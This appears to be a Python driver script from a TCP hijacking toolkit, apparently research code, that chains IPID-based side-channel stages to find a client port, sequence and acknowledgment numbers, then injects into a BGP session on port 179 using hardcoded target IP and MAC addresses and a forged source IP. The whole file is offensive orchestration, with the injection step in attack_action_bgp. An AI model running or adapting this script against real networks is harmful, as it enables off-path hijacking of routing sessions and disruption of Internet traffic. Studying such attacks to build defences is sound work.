# coding=utf-8

import time

from IPID_HCSC.connetcion_find import Connection_Finder
from IPID_HCSC.seq_find import Seq_Finder
from IPID_HCSC.ack_find import *


if __name__ == '__main__':
    server_mac = '52:54:00:df:b4:7e'
    server_ip = '172.21.0.16'
    server_port = 179

    client_ip = '182.92.129.182'

    attack_bind_if = 'eth0'
    own_ip_prefix = '10.10.0.0'
    collision_ip = '10.10.15.86'

    connection = Connection_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                                   server_port=server_port, server_mac=server_mac, bind_if_name=attack_bind_if)
    connection.run()
    client_port = connection.result

    if client_port == -1:
        print('No Connection Found.')
        exit(1)

    time.sleep(3)
    seq = Seq_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                     server_port=server_port, client_port=client_port,
                     server_mac=server_mac, bind_ifname=attack_bind_if, verbose=True)
    seq.run()
    seq_in_win = seq.result

    if seq_in_win == -1:
        print('Seq Find Miss')
    else:
        ack = Ack_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                         server_port=server_port, client_port=client_port, seq_in_win=seq_in_win,
                         server_mac=server_mac, bind_if_name=attack_bind_if)

        ack.run_attack_bgp()
        seq_num = ack.seq_num
        ack_num = ack.ack_in_win
        attack_action_bgp(client_ip=client_ip, server_ip=server_ip, client_port=client_port,
                          server_port=server_port, seq=seq_num, ack=ack_num)

        print('------ Total Statistics ------')
        print('Time: ' + str(connection.cost_time + seq.cost_time + ack.cost_time) + ' (s)')
        print('Packets: ' + str(connection.send_n + seq.send_n + ack.send_n))
        print('Bytes: ' + str(connection.send_byte + seq.send_byte + ack.send_byte) + ' (bytes)')
